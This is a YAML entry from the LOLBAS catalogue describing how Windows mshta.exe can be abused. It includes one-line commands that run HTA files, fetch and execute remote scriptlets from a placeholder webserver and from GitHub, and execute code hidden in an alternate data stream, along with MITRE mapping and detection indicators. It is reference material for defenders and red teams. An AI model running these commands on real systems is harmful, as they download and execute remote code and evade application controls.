---
name: Mshta.exe
description: Used by Windows to execute html applications. (.hta)
functions:
  execute:
    - description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
      code: mshta.exe evilfile.hta
      mitreid: T1170
      mitrelink: https://attack.mitre.org/wiki/Technique/T1170
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute code
    - description: Executes VBScript supplied as a command line argument.
      code: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
      mitreid: T1170
      mitrelink: https://attack.mitre.org/wiki/Technique/T1170
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute code
    - description: Executes JavaScript supplied as a command line argument.
      code: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
      mitreid: T1170
      mitrelink: https://attack.mitre.org/wiki/Technique/T1170
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute code
  ads:
    - description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
      code: mshta.exe "C:\ads\file.txt:file.hta"
      mitreid: T1170
      mitrelink: https://attack.mitre.org/wiki/Technique/T1170
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute code hidden in alternate data stream
resources:
    - resource: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
    - resource: https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
    - resource: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
    - resource: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
fullpath:
    - path: C:\Windows\System32\mshta.exe
    - path: C:\Windows\SysWOW64\mshta.exe
detection:
  - IOC: mshta.exe executing raw or obfuscated script within the command-line
  - IOC: Usage of HTA file
acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
